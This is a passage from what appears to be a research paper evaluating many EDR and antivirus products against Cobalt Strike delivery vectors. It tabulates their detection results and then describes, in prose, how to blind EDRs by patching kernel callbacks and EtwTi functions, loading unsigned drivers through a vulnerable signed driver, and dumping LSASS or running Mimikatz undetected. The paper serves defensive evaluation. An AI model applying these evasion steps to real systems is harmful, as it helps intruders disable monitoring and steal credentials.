very\nintuitive user interface. The latter provides a clear view of the incident itself and the machine’s state\nduring an attack through process trees and indicators of attacks. Falcon Insight’s kernel-mode driver\ncaptures more than 200 events and related information necessary to retrace incidents. Besides the\nclassic usage of kernel callbacks and usermode hooks, Falcon also subscribes to ETWTi[14].\n\n14https://www.reddit.com/r/crowdstrike/comments/n9to1b/interesting_stuff/gxq0t1t\n\n\n-----\n\n#### Figure 15: CPL and EXE files used for the attacks contained by OpenEDR.\n\nWhen it comes to process injections, most EDRs, including Falcon, continuously check for Windows APIs like VirtualAllocEx and NtMapViewOfSection prior to scanning the memory. Once\nFalcon finds any of these called by any process, it quickly checks the allocated memory and whether\nthis was a new thread created from a remote process. In this case, it keeps track of the thread ID,\nextracts the full injected memory and parses the .text section, the Exports section, the PE header,\nthe DOS header and displays the name of the PE, start/stop date/time, not limited to the export\naddress of the loaded function.\nAs for the response part, it provides extensive real-time response capabilities and allows the\ncreation of custom IOAs based on process creation, network connections, file creation, among others.\n\n#### 4.6.1 Enabled settings\n\nFor this EDR we used an aggressive policy enabling as much features as possible. It was a policy\nalready used in a corporate environment with its goal being maximum protection and minimum\ndisruption.\n\n#### 4.6.2 DLL - CPL - HTA\n\nNone of these three attack vectors produced any alerts and allowed the Cobalt Strike beacon to be\nexecuted covertly.\n\n#### 4.6.3 EXE\n\nQuite interestingly, the EXE was detected, although direct system calls were used to bypass user-mode\nhooking. Note that the alert is of medium criticality. Also, please note the spoofed parent process\nin Figure 16.\n\n### 4.7 Elastic EDR\n\nElastic EDR is one of the few open source solutions in the market. It is built upon the well-known\nELK stack allowing for advanced search and visualisation capabilities and its open nature allows for\nfurther customisation.\n\n#### 4.7.1 Enabled settings\n\nWe enabled all prevention settings and available sources, e.g. file modifictions.\n\n#### 4.7.2 DLL\n\nThe DLL attack was detected and blocked once it touched the disk, see Figure 17.\n\n#### 4.7.3 CPL\n\nThe DLL attack was detected in memory and blocked, see Figure 18.\n\n\n-----\n\n#### Figure 16: Crowdstrike catching the ‘Early-Bird’ injection despite the use of direct syscalls.\n\n Figure 17: ELASTIC EDR detecting and blocking the DLL attack.\n\n Figure 18: ELASTIC EDR detecting and blocking the CPL attack.\n\n 4.7.4 EXE-HTA\n\nBoth attacks were successfully launched and did not raise any alert.\n\n\n-----\n\n### 4.8 ESET PROTECT Enterprise\n\nESET PROTECT Enterprise is a widely used endpoint solution that uses behaviour and reputation\nsystems to mitigate attacks. Moreover, it uses cloud sandboxing to prevent zero-day threats and full\ndisk encryption for enhanced data protection. The EPP uses real-time feedback collected from million\nof endpoints using, among others, kernel callbacks, ETW (Event Tracing for Windows), and hooking.\nESET PROTECT Enterprise allows fine-tuning through editing XML files and customising policies\ndepending on users and groups. For this, blue teams may use a file name, path, hash, command line,\nand signers to determine the trigger conditions for alerts.\nWe used ESET PROTECT Enterprise with the maximum available predefined settings, see Figure\n19 without further fine tuning.\n\n#### Figure 19: ESET PROTECT Enterprise settings.\n\n 4.8.1 Enabled settings\n\nFor this EPP we used the predefined policy for maximum security, as stated by ESET in the console.\nThis makes use of machine learning, deep behavioural inspection, SSL filtering, PUA detection and\nwe decided to hide the GUI from the end user.\n\n#### 4.8.2 EXE-DLL\n\nBoth these attack vectors were successfully executed, without the EPP blocking and reporting any\nalert, see Figure 20.\n\n#### Figure 20: Bypassing ESET PROTECT Enterprise with the EXE and DLL attacks.\n\n 4.8.3 CPL-HTA\n\nThe CPL and HTA attacks were correctly identified and blocked by ESET PROTECT Enterprise,\nsee Figures 22 and 21, respectively. It should be noted that the memory scanner of ESET correctly\nidentified malicious presence but falsely named the threat as Meterpreter.\n\n### 4.9 F-Secure Elements\n\nF-Secure Elements can have several products under it, for this experiment, two products were\ntested, namely Endpoint Protection Platforms (EPP) and Endpoint Detection and Response solutions (EDR). Both solutions collect behavioural events from the endpoints, including file access,\nprocesses, network connections, registry changes and system logs. To achieve this, the Elements use\nEvent Tracing for Windows among other capabilities. While F-Secure Elements EDR uses machine\nlearning for enrichments, human intervention from cyber-security experts is often used. The EDR\nalso features built-in incident management. Moreover, after a confirmed detection, F-Secure Elements EDR has built-in guidance to facilitate users in taking the necessary steps to contain and\nremediate the detected threat.\n\n\n-----\n\n#### Figure 21: ESET PROTECT Enterprise detects the HTA attack.\n\n Figure 22: ESET PROTECT Enterprise detects the CPL attack.\n\n 4.9.1 Enabled settings\n\nIn terms of our experiments, we experimented with both the EPP and the EDR solution enabling\nall features available, including DeepGuard. We also included browsing control based on reputation,\nand the firewall was up and running. In the first version of the manuscript, only the results of the\n\n\n-----\n\nEPP were included. Notably, all of the launched attacks were successful, and F-Secure Elements\nEPP reported no alerts, see Figure 23.\nHowever, after collaborating with F-Secure, it was discovered that the initial test was only done\nfor the EPP solution. As such, F-Secure assisted in setting up the licensing for the EDR product so\nthat we can perform the test from our environment. In order to make sure that no new detections are\nconsidered, in this configuration, the database license was downgraded to an earlier date: June 18,\n2021. We tested these attacks against the F-Secure EDR twice. There were three attacks detected\nduring these tests. Two of these attacks were detected immediately, while the third one had a\ntime delay of 5 hours during the initial. Since F-Secure downgraded the databases, there was some\nconfusion that led to the misconfiguration of the backend systems. Once the misconfiguration was\nrectified, the delay for that one particular attack was reduced to 25 minutes. Due to the nature of\nEDR products, none of the attacks was blocked.\n\n#### Figure 23: F-Secure Elements EPP console after launching our attacks reports no security event.\n\n 4.9.2 F-Secure EPP\n\nIn the case of F-Secure EPP no attack was detected nor blocked, see Figure 23 as also validated by\nthe vendor.\n\n#### 4.9.3 F-Secure EDR\n\nIn the case of F-Secure EDR, as already discussed, two experiments were conducted in collaboration\nwith F-Secure. There were three attacks detected during these tests. Two of these attacks were\ndetected immediately, while the third one had a time delay of 5 hours during the initial. experiment.\nAccording to F-Secure this was due to the database downgrade which caused a misconfiguration of\nthe backend systems. After some resolution from the vendor side, the delay for that particular attack\nwas reduced to 25 minutes. Due to the nature of EDR products, none of the attacks was blocked.\nIt should be noted that, as illustrated in Figure 24, the two attack vectors were merged into one\nattack from the EDR, where one of them was marked with a medium alert. However, the merging\nof the attacks can be attributed to their timing. Finally, the EXE attack vector was successful in all\ncases. A brief detection history regarding the detections that the F-Secure Elements EDR collected\nis illustrated in Figure 25.\n\n### 4.10 FortiEDR\n\nFortiEDR is heavily based on its simulation mode which we did not use due to time constraints and\nthe nature of the experiments, its a training session for it to learn and understand the function of\nthe organization. It makes the most out of the callbacks and tries identify and block the unmapped\ncode and its dynamic behaviour in the infection process. According to our experiments these alerts\noccur in cases where reflective injection is performed as we have observed this alert in several tools\nthat use the aforementioned technique,also, as mentioned in the description the alert is related to\nfiles loaded form memory. Also, the COM activity for the HTA was blocked.\n\n#### 4.10.1 Enabled settings\n\nIn FortiEDR we used an aggressive setting with all features enabled and block mode everywhere.\n\n#### 4.10.2 CPL-HTA-EXE-DLL\n\nFortiEDR managed to detect and block all attack vectors as illustrated in Figures 26, 27, 28, and 29.\n\n\n-----\n\n#### Figure 24: F-Secure Elements EDR console with the detection of the attacks as an attack tree.\n\n### 4.11 Kaspersky Endpoint Security\n\nKaspersky Endpoint Security is an endpoint security platform with multi-layered security measures\nthat exploits machine learning capabilities to detect threats. Moreover, this EPP agent serves also\nas the EDR agent also facilitating vulnerability and patch management and data encryption.\n\n#### 4.11.1 Enabled settings\n\nIn our experiments, we enabled all security-related features in every category. However, we did not\nemploy any specific configuration for Web and Application controls. More precisely, we created a\npolicy and enabled all options including behavior detection, exploit and process memory protection,\nHIPS, Firewall, AMSI and FileSystem oritection modules. The actions were set to block and delete\nall malicious artifacts and behaviors.\n\n#### 4.11.2 CPL-HTA-EXE\n\nIn the case of CPL, HTA, and EXE attack vectors, Kaspersky Endpoint Security timely identified\nand blocked our attacks, see Figure 30. More precisely, the EXE and CPL processes were killed after\nexecution, while the HTA was blocked as soon as it touched the disk.\n\n#### 4.11.3 DLL\n\nOur DLL attack was successfully launched and no telemetry was recorded by Kaspersky Endpoint\nSecurity.\n\n### 4.12 McAfee Endpoint Protection\n\nMcAfee Endpoint Protection is among the most configurable and friendly to the technical user\nsolutions, it allows reacting to specific process behaviours, i.e. remote memory allocation, but also\nto proactively eliminate threats by reducing the options an attacker has based on a handful of\noptions such as blocking program registration to autorun. We decided to leverage this configurability\nand challenge McAfee Endpoint Protection to the full extend and only disabled one rule blocking\nexecution from common folders such as the Desktop folder. The rationale behind this choice is\nusability since activating this rule would cause many usability issues in an everyday environment.\n\n\n-----\n\n#### Figure 25: F-Secure Elements EDR showing detailed logs of the detected attacks.\n\nIn our experiments, we managed to successfully bypass the restrictions using our direct syscalls\ndropper and allocate memory remotely as well as execute it. The latter is an indicator that the\ntelemetry providers and processing of the information is not efficient.\n\n\n-----\n\n#### Figure 26: FortiEDR blocking the CPL attack.\n\n Figure 27: FortiEDR blocking the HTA attack.\n\n 4.12.1 Enabled settings\n\nFor this EPP, we decided to challenge McAfee since it offers a vast amount of settings and a lot of\noption for advanced users such as memory allocation controls etc. It was also quite interesting that\nsome policies were created by default to block suspicious activities such as our HTA’s execution. We\nopted to enable all options without exception apart from one that was block execution from user\nfolders and would cause issues in a corporate environment.\nAn excerpt of the settings that were enabled is illustrated in Figure 31.\n\n#### 4.12.2 HTA-CPL\n\nBoth HTA and CPL-based attacks were identified and blocked. However, it should be noted that the\nHTA attack was blocked due to the applied policy of blocking execution of all HTA files, see Figure\n32.\n\n#### 4.12.3 EXE-DLL\n\nBoth the EXE and DLL-based attacks were successfully executed without being identified by McAfee\nEndpoint Protection nor producing any telemetry.\n\n\n-----\n\n#### Figure 28: FortiEDR blocking the DLL attack.\n\n Figure 29: FortiEDR blocking the EXE attack.\n\n### 4.13 Microsoft Defender for Endpoints (ex. ATP)\n\nMicrosoft Defender for Endpoints is heavily kernel-based rather than user-based, which allows for\ngreat detection capabilities. The beauty of MDE lies in the fact that most of the detection capability\nlies in Windows itself, albeit not utilised unless the machine is onboarded. For these tests, the EDR\nwas set to block mode to prevent instead of merely detecting. Its telemetry sources include kernel\n\n\n-----\n\n#### Figure 30: Screenshots from KEPP illustrating the malicious activity that it detected and blocked.\n\ncallbacks utilised by the WdFilter.sys mini-filter driver. As previously mentioned callbacks are set\nto ”intercept” activities once a condition is met. e.g. when module is loaded. As an example of\nthose consider:\n\n    - PsSetCreateProcessNotifyRoutine(Ex) - Process creation events.\n\n   - PsSetCreateThreadNotifyRoutine - Thread creation events.\n\n   - PsSetLoadImageNotifyRoutine - Image(DLL/Driver) load events.\n\n   - CmRegisterCallback(Ex) - Registry operations.\n\n    - ObRegisterCallbacks - Handle operations(Ex: process access events).\n\n    - FltRegisterFilter - I/O operations(Ex: file system events).\n\nThey also include a kernel-level ETW provider rather than user-mode hooks. This comes as a solution\nto detecting malicious API usage since hooking the SSDT (System Service Dispatch Table) is not\nallowed thanks to Kernel Patch Protection (KPP) PatchGuard (PG). Before moving on we should\n\n\n-----\n\n#### Figure 31: An excerpt of the settings that were enabled in McAfee Endpoint Protection.\n\n Figure 32: McAfee Endpoint Protection blocking the HTA attack.\n\nnote a different approach taken by Kaspersky to hook the kernel it made use of its own hypervisor.\nThis comes with several downsides as it requires virtualization support [15].\nSince Windows 10 RS3, the NT kernel is instrumented using EtwTi functions for various APIs\ncommonly abused for process injection, credential dumping etc. and the telemetry available via a\nsecure ETW channel[16]. Thus, MDE heavily relies on EtwTi, in some cases even solely, for telemetry.\nAs an example of the ETWTi sensor, consider the alert below 33. It is an alert produced by\nrunning our EXE payload on a host that MDE is in passive mode. Note that although our payload\nuses direct system calls, our injection is detected.\nDue to the fact that the callbacks operate at the kernel level (Ring 0), an attacker needs to have\nhigh integrity level code execution in a machine to blind them or render them useless successfully.\nAn attacker may choose any one of the following three techniques to achieve this:\n\n    - Zero out the address of the callback routine from the kernel callback array that stores all the\naddresses.\n\n    - Unregister the callback routine registered by WdFilter.sys.\n\n    - Patch the callback routine of WdFilter.sys with a RET(0xc3) instruction or hook it.\n\nDue to the nature of the ETWTi Sensor telemetry, it is not possible to blind the sources from\na medium-IL context and needs admin/a high-IL context. Once this is achieved, an attacker may\nemploy any one of the following methods:\n\n15https://github.com/iPower/KasperskyHook\n16https://blog.redbluepurple.io/windows-security-research/kernel-tracing-injection-detection\n\n\n-----\n\n#### Figure 33: Example of MDE catching the APC Early-Bird injection although direct syscalls were used.\n\n     - Patch a specific EtwTi function by inserting a RET/0xC3 instruction at the beginning of the\nfunction so that it simply returns without executing further. Not KPP-safe, but an attacker\nmay avoid BSOD‘ing the target by simply restoring the original state of the function as soon as\ntheir objective is accomplished. In theory, Patch Guard may trigger at any random time, but\nin practice, there is an extremely low chance that PG will trigger exactly during this extremely\nshort interval.\n\n    - Corrupt the EtwTi handle.\n\n     - Disable the EtwTi provider.\n\n#### 4.13.1 Enabled settings\n\nWe enabled all the basic features including the tamper protection, the block mode option and auto\ninvestigation. Most is handled in the background and the admins are able to configure connection\nto intune which was out of scope. We also enabled file and memory content analysis using the cloud\nthat will upload suspicious files and check them.\n\n#### 4.13.2 CPL - EXE - HTA\n\nMost of these vectors were detected as soon as they touched the disk or were executed. Find the\nrelevant alerts in Figure 34.\n\n#### Figure 34: Alerts produced by MDE in total.\n\nNote that for the .cpl file, despite the fact that the EDR detected it, it was executed with a\nfully functional beacon session.See Figure 35.\nFind below the relevant auto-investigation started for this MDE incident, including all the alerts\nproduced. Note that till successful remediation and full verdict, the investigation may take a lot of\ntime. See Figure 36\n\n#### 4.13.3 DLL\n\nThe DLL side-loading attack was successful as the EDR produced no alerts nor any suspicious\ntimeline events. Figure 37 illustrates the produced telemetry. Notice the connection to our malicious\ndomain and the uninterrupted loading of our module.\n\n\n-----\n\n#### Figure 35: Details about the alerts produced from MDE.\n\n### 4.14 Panda Adaptive Defense 360\n\nPanda is a well-known solution that was categorized by Gartner for 2021 and 2019 as a ”niche player”.\nIts detections are based on kernel callbacks and ETW mostly as far as the vectors are concerned.\nIt provides the user with a UI on which the entire attack paths can be seen and according to the\nvendors provides the clients with ”unified EPP and EDR capabilities to effectively detect and classify\n_100% of processes running on all the endpoints within your organization”._\n\n#### 4.14.1 Enabled settings\n\nWe created a policy for maximum active protection.\n\n#### 4.14.2 CPL\n\nThe CPL attack vector was detected and blocked but only the host had an alert about it, see Figure\n38.\n\n#### 4.14.3 EXE\n\nIn this case, the attack was successful and after some time an alert was raised, see Figure 39.\n\n#### 4.14.4 DLL - HTA\n\nBoth attack vectors were successful and raised no alert.\n\n### 4.15 Sentinel One\n\nSentinel One has sophisticated AI-based behavioural analysis features that make stealth infiltration\nand tool execution rather difficult. Among others, Sentinel One collects ETW telemetry and monitors\nalmost all parts of the system. It uses kernel callbacks to collect information such as process creation,\nimage load, thread creation, handle operations, registry operations. It also produces detailed attack\npaths and process tree graphs.\nAlso, Sentinel One recently released a new custom detection engine called STAR. With STAR\ncustom detection rules, SOC teams can turn queries from Deep Visibility, SentinelOne’s EDR data\ncollection and querying mechanism, into automated hunting rules that trigger alerts and responses\nwhen rules detect matches. STAR also allows users an automated way to look at every endpoint\nevent collected across their entire fleet and evaluate each of those events against a list of rules.\n\n\n-----\n\n#### Figure 36: Auto investigation by MDE.\n\nHowerver, our results indicate that the Sentinel One has severe issues in handling PowerShellbased post-exploitation activities. Thus, one could easily run tools such as PowerView using just\nsome IEX cradles.\n\n#### 4.15.1 Enabled settings\n\nFor this solution we decided to enable all the features needed using the buttons in the console to use\nits engines including static and behavioral AI, script, lateral movement, fileless threat detection etc.\nMoreover, we enabled all the features Deep Visibility provides apart from the full disk scan and data\nmasking. We also chose to kill processes and quarantine the files.\nSentinel One has some new features that when the first tests were conducted were in test mode,\nmeaning that they were not used and also required custom configuration to be enabled.\n\n\n-----\n\n#### Figure 37: Timeline events for DLL sideloading by MDE.\n\n Figure 38: Panda Adaptive Defense 360 detection of the EXE attack in host indicating that the vector has run.\n\n Figure 39: Panda Adaptive Defense 360 detection of the EXE attack after execution (left) and the produced graph (right).\n\n 4.15.2 EXE - HTA - CPL\n\nNotably, none of these attack vectors issued an alert to Sentinel One. With the test features enabled\nall three attack vectors that passed were blocked since the EDR was targeting the core of the payloads,\n\n\n-----\n\nthus, the shellcode itself.\n\n#### 4.15.3 DLL\n\nAs soon as the folder with the MS-Teams installation touched the disk, an alert was triggered\nindicating that the malicious DLL was unsigned, and this could be a potential risk.\n\n#### Figure 40: Sentinel One reporting the DLL attack.\n\nAs it can be observed in Figure 40, the high entropy of our DLL was detected as an IoC. The\nIoC was correct as our shellcode was AES encrypted. It should be noted that previous experiments\nwith Sentinel One with low entropy files (using XOR encoding) passed the test without any issues\nimplying that the actual issues were due to the high entropy of the DLL.\n\n\n-----\n\n### 4.16 Sophos Intercept X with EDR\n\nSophos Intercept is one of the most well-known and trusted AVs/EDRs. It has been previously\nused as a test case for user-mode hook evasion[17]. The EDR version provides a complete view of the\nincidents and really detailed telemetry, as well as a friendly interface with insightful graphs. Some\nof its features can be seen Figure 41.\n\n#### Figure 41: The settings for Sophos.\n\n 4.16.1 Enabled settings\n\nIn the case of Sophos, the configuration was simple and intuitive for the user. Therefore, we enabled\nall offered features, which provided protection without usability issues.\n\n#### 4.16.2 EXE\n\nThis was the only vector that worked flawlessly against this EDR. In fact, only a small highlight\nevent was produced due to its untrusted nature because it was not signed. PPID spoofing worked,\nand no alerts were produced, but the activities of werfault.exe were logged by Sophos, e.g. the\nconnection to our domain.See Figure 42.\n\n17https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr```\nhooking/\n\n```\n\n-----\n\n#### Figure 42: Executable was able to run the shellcode and connect to the C2.\n\n 4.16.3 DLL\n\nUnfortunately, the malicious DLL could not be loaded, yet the EDR produced no alert. Interestingly,\nthe application was executed normally without the DLL in the folder. We assume that there might\nbe some interference due to the EDR’s process protection features as the payload was functioning\nnormally.\n\n#### 4.16.4 CPL\n\nAs soon as the .cpl file was executed, an alert was produced, the process was blocked, and the attack\npath in Figure 43 was created. As it can be observed, detailed telemetry was produced about the\nsystem’s activities.\n\n#### Figure 43: CPL was blocked by Sophos. Details and graph.\n\n\n-----\n\n#### 4.16.5 HTA\n\nAs soon as the iexplore.exe visited and downloaded the hta file, its actions were blocked, and\ndetailed attack telemetry was produced once again.See Figures 44 and 45.\n\n#### Figure 44: HTA was blocked by Sophos. Details and graph.\n\n Figure 45: Network connections to our domain as logged by Sophos.\n\n### 4.17 Symantec Endpoint Protection\n\nSymantec Endpoint Protection is a well-known solution and among the most used ones in multiple\nindustries. It combines a highly sophisticated static detection engine with emulators. The latter\nconsiders anti-evasion techniques, addressing packed malware obfuscation techniques and detects\nthe malware that is hidden inside even custom packers. Symantec Endpoint Protection uses a\nmachine learning engine to determine whether a file is benign or malicious through a learning process.\nSymantec Security Response trains this engine to recognise malicious attributes and defines the\nmachine learning engine’s rules to make detections. Symantec leverages its cloud service to confirm\nthe detection that the machine learning engine made. To protect endpoint devices, it launches\na specially anti-malware mechanism on startup, before third-party drivers initialise, preventing the\nactions of malicious drivers and rootkits, through an ELAM driver[18]. The EDR is highly configurable\nand easy to adapt to everyday enterprise life with a powerful HIDS and network monitoring which\nenable it to identify and block network-based lateral movement, port scans, as well as common\nmalware network behaviour, e.g. meterpreter’s default HTTPS communication.\n\n18https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements\n\n\n-----\n\n#### 4.17.1 Enabled settings\n\nWe enabled the default features using the default levels of protection. They were enough to provide\nadequate protection without causing issues.\n\n#### 4.17.2 HTA\n\nIn our attacks, Symantec Endpoint Protection managed to identify and block only the HTA attack,\nsee Figure 46. However, no alert was raised to the user.\n\n#### Figure 46: Identified and blocked HTA attack from Symantec Endpoint Protection.\n\n 4.17.3 CPL-EXE-DLL\n\nAll three attack vectors (CPL, EXE, and DLL) were successful, without the EPP identifying, blocking\nthem or producing any alert.\n\n### 4.18 Trend Micro Apex One\n\nApex One is a well-known solution and ranked among the top ones on Gartner’s table. Its overall\nfeatures beyond the basic protection and firewall capabilities include predictive machine learning\nand can also be used for offline protection. The lightweight, offline model helps to protect the\nendpoints against unknown threats even when a functional Internet connection is not unavailable.\nSecurity Agent policies provide increased real-time protection against the latest fileless attack methods through enhanced memory scanning for suspicious process behaviours. Security Agents can\nterminate suspicious processes before any damage can be done. Enhanced scan features can identify\nand block ransomware programs that target documents that run on endpoints by identifying common\nbehaviours and blocking processes commonly associated with ransomware programs. You can configure Security Agents to submit file objects containing previously unidentified threats to a Virtual\nAnalyzer for further analysis. After assessing the objects, Virtual Analyzer adds the objects it determined to contain unknown threats to the Virtual Analyzer Suspicious Objects lists and distributes\nthe lists to other Security Agents throughout the network. Finally, Behaviour Monitoring constantly\nmonitors endpoints for unusual modifications to the operating system and installed software.\nAccording to our research, Apex One uses network, kernel callbacks, hooking; in both kernel and\nusermode, ETW, and AMSI to perform behavioural detection. More specifically, for ETW Apex\nOne uses a data collector called TMSYSEVT ETW.\n\n#### 4.18.1 Enabled settings\n\nIn Apex One we leveraged as much features as possible that were presented in the policy editor\nsuch as the EDR’s smart scanning method, intelliscan, scanning of compressed files, OLE object\nscanning, intellitrap (a feature used to combat real time compression of malware), ransomware protection (behavioural protection against ransomware, not needed for our tests), anti exploit protection,\nmonitoring of newly encountered programs, C&C traffic filtering, and of course predictive machine\nlearning. Finally, we configured the EDR to block all malicious behaviour.\n\n\n-----\n\n#### 4.18.2 EXE-DLL-CPL-HTA\n\nAfter collaboration with Trend Micro we performed the experiments in the provided environment.\nNotably, all attack vectors were successful. However, there were three generic alerts with low criticality that were raised notifying that, e.g. an HTA or a CPL file were opened. The latter does not\nnecessarily mean that there was a malicious usage.\n\n#### Figure 47: HTA attack against Apex One.\n\n### 4.19 Aggregated results\n\n#### EDR CPL HTA EXE DLL BitDefender GravityZone Plus \u0017 \u0017 \u0013 \u0017 Carbon Black Response • \u0017 \u0013 \u0013 Check Point Harmony \u0017 ⋄ \u0017 \u0013 Cisco AMP \u0017 \u0017 \u0013 ⊙ Comodo OpenEDR \u0017 \u0013 \u0017 \u0013 CrowdStrike Falcon \u0013 \u0013 \u0017 \u0013 Elastic EDR \u0017 \u0013 \u0013 \u0017 F-Secure Elements Endpoint Detection and Response ⋄ † \u0013 \u0017 FortiEDR \u0017 \u0017 \u0017 \u0017 Microsoft Defender for Endpoints ⋆ \u0017 \u0017 \u0013 Panda Adaptive Defense 360 \u0017 \u0013 ⋆ \u0013 Sentinel One (without test features) \u0013 \u0013 \u0013 \u0017 Sentinel One (with test features) \u0017 \u0017 \u0017 \u0017 Sophos Intercept X with EDR \u0017 \u0017 \u0013 - Trend micro Apex One • • \u0013 \u0013 Endpoint Protection ESET PROTECT Enterprise \u0017 \u0017 \u0013 \u0013 F-Secure Elements Endpoint Protection Platform \u0013 \u0013 \u0013 \u0013 Kaspersky Endpoint Security \u0017 \u0017 \u0017 \u0013 McAfee Endpoint Protection \u0017 \u0017 \u0013 \u0013 Symantec Endpoint Protection \u0013 \u0017 \u0013 \u0013\n\n Table 1: Aggregated results of the attacks for each tested solution. Notation: \u0013: Successful attack,⋄ Successful attack, raised medium alert, •: Successful attack, raised minor alert, ⋆: Successful attack, alert was raised ◦:Unsuccessful attack, no alert raised, \u0017: failed attack, alerts were raised. † In two experiments supplied by the vendor, in the first it was detected after five hours, in the second it was detected after 25 minutes. ⊙ Initial test was blocked due to file signature, second one was successful with another application.\n\nTable 1 illustrates an aggregated overview of our findings. Evidently, from the 20 attacks that\nwere launched, more than half of them were successful. It is rather alarming that none of the EDRs\nmanaged to detect all of the attacks. More precisely, 10 attacks were completely successful, as they\nwere completed successfully and no alert was issued; 3 attacks were successful, yet they issued a\nlow significance alert; 1 attack was not successful, yet it did not issue an alert, and 6 attacks were\ndetected and correctly reported by the EDRs.\n\n#### Figure 48: Detected and blocked CPL attack against Apex One.\n\n|EDR|CPL|HTA|EXE|DLL|\n|---|---|---|---|---|\n|BitDefender GravityZone Plus|\u0017|\u0017|\u0013|\u0017|\n|Carbon Black Response|•|\u0017|\u0013|\u0013|\n|Check Point Harmony|\u0017|⋄|\u0017|\u0013|\n|Cisco AMP|\u0017|\u0017|\u0013|⊙|\n|Comodo OpenEDR|\u0017|\u0013|\u0017|\u0013|\n|CrowdStrike Falcon|\u0013|\u0013|\u0017|\u0013|\n|Elastic EDR|\u0017|\u0013|\u0013|\u0017|\n|F-Secure Elements Endpoint Detection and Response|⋄|†|\u0013|\u0017|\n|FortiEDR|\u0017|\u0017|\u0017|\u0017|\n|Microsoft Defender for Endpoints|⋆|\u0017|\u0017|\u0013|\n|Panda Adaptive Defense 360|\u0017|\u0013|⋆|\u0013|\n|Sentinel One (without test features)|\u0013|\u0013|\u0013|\u0017|\n|Sentinel One (with test features)|\u0017|\u0017|\u0017|\u0017|\n|Sophos Intercept X with EDR|\u0017|\u0017|\u0013|-|\n|Trend micro Apex One|•|•|\u0013|\u0013|\n|Endpoint Protection|||||\n|ESET PROTECT Enterprise|\u0017|\u0017|\u0013|\u0013|\n|F-Secure Elements Endpoint Protection Platform|\u0013|\u0013|\u0013|\u0013|\n|Kaspersky Endpoint Security|\u0017|\u0017|\u0017|\u0013|\n|McAfee Endpoint Protection|\u0017|\u0017|\u0013|\u0013|\n|Symantec Endpoint Protection|\u0013|\u0017|\u0013|\u0013|\n\n\n-----\n\n## 5 Tampering with Telemetry Providers\n\nApart from finding ‘blind spots’ for each EDR there is also the choice of ‘blinding’ them by tampering\nwith their telemetry providers in various ways. Unhooking user-mode hooks and utilising syscalls\nto evade detection is the tip of the iceberg [2]. The heart of most EDRs lies in the kernel itself as\nthey utilise mini-filter drivers to control file system operations and callbacks in general to intercept\nactivities such as process creation and loading of modules. As attackers, once high integrity is\nachieved, one may effectively attack the EDRs in various ways, including patching the ETWTi\nfunctions of Defender for Endpoints and removing callbacks of the Sophos Intercept X to execute\nhacking tools and remain uninterrupted. Note that our goal during the following POCs was not to\nraise any alert in the EDR consoles, something that was successfully achieved.\n\n### 5.1 Attacking Defender for Endpoints\n\nIn what follows, we present two attacks, both executed manually using WinDBG. To circumvent\nthe Patch Guard protection mechanism, we performed all actions quickly to avoid introducing noise\nthat could trigger the EDR. Note that the EDR was in passive mode for this test since we are only\ninterested in silencing the produced alerts.\n\n#### 5.1.1 Manually Patching Callbacks to Load Unsigned Drivers\n\nIn this case, our process will be manually patching some of the contents of the\n```\nPspLoadImageNotifyRoutine global array, which stores the addresses of all the registered callback\n\n```\nroutines for image loading. By patching the callback called SecPsLoadImageNotify, which is registered with the mssecflt.sys driver, we are essentially blinding the EDR as far as loading of drivers\nis concerned.\nIt is important to note here how the EDR detects whether the Driver Signature Enforcement\n(DSE) is disabled. Strangely, the alert about a possibly disabled DSE is triggered once an unsigned\ndriver is loaded. Therefore, the MDE assumes that since an unsigned driver has been loaded, the\nDSE was disabled. See Figure 49.\n\n#### Figure 49: DSE Alert by MDE. Telemetry Sourcerer driver detection.\n\nThen, after the callback is patched, we will zero-out the g CiOptions global variable whose default\nvalue is 0x6 indicating that DSE is on. Then, we load our driver using the OSR driver loader utility.\nAfterwards, we reset the g CiOptions variable and the patched callback to avoid a possible bug check\nby Patch Guard, and thus our system crashing. See Figure 50.\n\n#### 5.1.2 Manually Patching an ETWTi Function to Dump LSASS without Alerts\n\nIn this POC, we manually patch the EtwTiLogReadWriteVm function, which is responsible for the\ntelemetry of the NtReadVirtualMemory syscall, which is called from MiniDumpWriteDump which is\nused by many Local Security Authority Subsystem Service (LSASS) dumping tools. We are using\nthe Outflank-Dumpert tool [8] to dump the LSASS memory that uses direct syscalls, which may\nevade most common EDRs but not MDE, see Figure 51.\nFind below the procedure we followed to achieve an ‘undercover’ LSASS dump. Note how we\nconvert the virtual address to the physical address to execute our patch successfully. This is because\nthis is a read-only page we want to write at, and any forced attempt to write there will result in a\n_blue screen of death. However, we may write on the physical address without any trouble. Notably,_\nwhile timeline events will most likely be produced, no alert will be triggered that will make SOCs\ninvestigate it further.\n\n\n#### Figure 49: DSE Alert by MDE. Telemetry Sourcerer driver detection.\n\nThen, after the callback is patched, we will zero-out the g CiOptions global variable whose default\nvalue is 0x6 indicating that DSE is on. Then, we load our driver using the OSR driver loader utility.\nAfterwards, we reset the g CiOptions variable and the patched callback to avoid a possible bug check\nby Patch Guard, and thus our system crashing. See Figure 50.\n\n\n-----\n\n#### Figure 50: Deleting the callback necessary.\n\n Figure 51: Sample Alert caused by Dumpert.\n\n### 5.2 Attacking Sophos Intercept X\n\nFor this EDR, our approach will is quite different. We utilise a legitimate and signed driver that is\nvulnerable, and by exploiting it, we may access the kernel and load a custom unsigned driver. The\ntools we will be using are going to be TelemetrySourcerer[19] that will provide us with the unsigned\ndriver that will actually suppress the callbacks for us, and we will communicate with it through an\napplication that will provide us with a GUI, as well as gdrv-loader[20] that will exploit the vulnerable\n\n19https://github.com/jthuraisamy/TelemetrySourcerer\n20https://github.com/alxbrn/gdrv-loader\n\n\n-----\n\n#### Figure 52: Patching the ETWTi function necessary.\n\ndriver of Gigabyte and load our driver. Beyond Sophos Intercept X, TelemetrySourcerer can be\nused in other EDR referred in this work, but for the sake of simplicity and clarity, we use it only for\nthis EDR use case here. Note that the EDR was in block mode for these tests, but we managed to\nbypass it and completed our task without raising any alerts, see Figures 53 and 54.\n\n\n#### Figure 53: Loading an unsigned driver via gdrv-loader.\n\nOnce we suppress all the callbacks by the sophosed.sys driver, the EDR cannot monitor, among\n\n\n-----\n\n#### Figure 54: Deleting Sophos’ callbacks via Telemetry Sourcerer’s UI.\n\nothers, process creations and filesystem activities. Therefore, one may easily execute arbitrary code\non the tools without the EDR identifying them, e.g. one may launch Mimikatz and remain uninterrupted, clearly showing the EDR’s inability to ‘see’ it, see Figure 55\n\n#### Figure 55: Running mimikatz without interruption.\n\nNevertheless, the user-mode 